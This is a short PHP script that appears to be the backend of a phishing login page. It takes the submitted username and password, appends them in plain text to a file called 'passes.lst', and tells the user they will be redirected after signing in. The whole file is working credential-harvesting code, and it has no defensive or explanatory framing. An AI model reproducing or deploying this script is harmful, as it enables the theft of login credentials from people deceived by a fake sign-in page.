<?php
if(isset($_POST['submit'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $data = $username . ' ' . $password . "\r\n";
    $ret = file_put_contents('passes.lst', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('An error has occurred');
    }
    else {
        echo "Thank you for signing in. You will be redirected shortly!";
    }
}
else {
   die('No post data to process');
}
?>
